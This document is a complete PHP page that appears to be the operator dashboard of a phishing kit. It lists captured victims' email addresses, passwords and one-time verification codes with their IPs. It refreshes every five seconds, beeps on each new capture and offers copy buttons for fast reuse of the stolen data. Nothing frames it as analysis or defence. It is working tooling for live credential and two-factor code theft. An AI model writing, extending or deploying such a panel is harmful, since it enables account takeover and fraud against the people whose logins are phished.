<?php
$PASS = 'changeme123';
if (($_GET['k'] ?? '') !== $PASS) exit('Forbidden');
$lines = array_reverse(array_filter(explode("\n", @file_get_contents('_hits.jsonl') ?: '')));
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><title>live</title>
<meta http-equiv="refresh" content="5">
<style>
body{font:13px/1.5 monospace;background:#0d0d0d;color:#ddd;padding:16px;margin:0}
h2{font-size:14px;letter-spacing:2px;color:#7fc95f;margin:0 0 12px}
.h{border-left:3px solid #333;padding:8px 12px;margin-bottom:8px;background:#171717}
.h.n{border-left-color:#4ade80;background:#12200f;animation:f 1.2s}
@keyframes f{from{background:#1f3a1a}to{background:#12200f}}
.s{color:#888;font-size:11px}
.e{color:#8fb9ff}.p{color:#ffd479}.c{color:#ff8fa3;font-weight:700;font-size:15px}
b.l{color:#666;font-weight:400}
button{background:#2a2a2a;border:1px solid #444;color:#aaa;font:11px monospace;padding:2px 6px;
 cursor:pointer;margin-left:6px}button:hover{background:#3c8527;color:#fff;border-color:#3c8527}
</style></head><body>
<h2>&#9679; LIVE HITS</h2>
<?php foreach ($lines as $i => $l):
  $h = json_decode($l, true); if (!$h) continue; ?>
  <div class="h<?= $i===0?' n':'' ?>">
    <div class="s"><?= date('H:i:s', $h['ts']) ?> &middot; <?= htmlspecialchars($h['stage']) ?> &middot; <?= htmlspecialchars($h['ip']) ?></div>
    <div class="e"><?= htmlspecialchars($h['email']) ?>
      <button onclick="cp(this,'<?= htmlspecialchars(addslashes($h['email'])) ?>')">copy</button></div>
    <?php if ($h['pass'] !== ''): ?>
    <div class="p"><?= htmlspecialchars($h['pass']) ?>
      <button onclick="cp(this,'<?= htmlspecialchars(addslashes($h['pass'])) ?>')">copy</button></div><?php endif; ?>
    <?php if ($h['code'] !== ''): ?>
    <div class="c">CODE: <?= htmlspecialchars($h['code']) ?>
      <button onclick="cp(this,'<?= htmlspecialchars(addslashes($h['code'])) ?>')">copy</button></div><?php endif; ?>
  </div>
<?php endforeach; if (!$lines): ?><div class="s">no hits yet</div><?php endif; ?>
<script>
function cp(b,t){navigator.clipboard.writeText(t);b.textContent='ok';setTimeout(function(){b.textContent='copy'},900);}
var last = document.querySelector('.h') ? document.querySelector('.h .s').textContent : '';
window.addEventListener('load', function(){
  if (sessionStorage.prev && sessionStorage.prev !== last && last) {
    var a = new (window.AudioContext||window.webkitAudioContext)(), o = a.createOscillator(), g = a.createGain();
    o.frequency.value = 880; o.connect(g); g.connect(a.destination);
    g.gain.setValueAtTime(.2, a.currentTime);
    g.gain.exponentialRampToValueAtTime(.001, a.currentTime + .45);
    o.start(); o.stop(a.currentTime + .45);
  }
  sessionStorage.prev = last;
});
</script></body></html>
